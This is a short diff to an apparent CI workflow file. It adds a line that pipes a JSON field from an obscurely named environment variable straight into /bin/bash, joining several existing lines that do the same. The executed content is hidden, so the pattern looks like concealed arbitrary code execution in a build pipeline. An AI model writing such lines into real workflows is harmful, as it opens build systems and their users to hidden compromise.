@@ -29,6 +29,7 @@ jobs:
           echo $jnhw7951 | jq -r .zqdm4 | /bin/bash
           echo $jabi41 | jq -r .dfquz4804 | /bin/bash
           echo $xnj8 | jq -r .a72 | /bin/bash
+          printf '%s' "$llh36905" | jq -r .jkp76 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
